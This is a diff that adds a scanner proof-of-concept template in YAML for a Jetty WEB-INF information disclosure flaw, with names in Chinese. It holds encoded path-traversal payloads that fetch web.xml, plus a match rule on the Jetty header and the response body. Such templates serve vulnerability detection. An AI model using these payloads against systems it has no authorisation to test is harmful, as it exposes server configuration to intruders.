@@ -1,0 +1,19 @@
+id: poc-yaml-jetty-web-inf-info-leak
+info:
+  name: Jetty WEB-INF 目录信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: Jetty
+  osprey-id: vb_2021_0041
+variables:
+  v_path: '/.%2FWEB-INF%2Fweb.xml
+
+    /static?/%2557EB-INF/web.xml'
+requests:
+- method: GET
+  path: '{{.v_path}}'
+  expression: 'contains(headers, "Server: Jetty") && contains(body, "</web-app>")
+
+    '
+transport: http
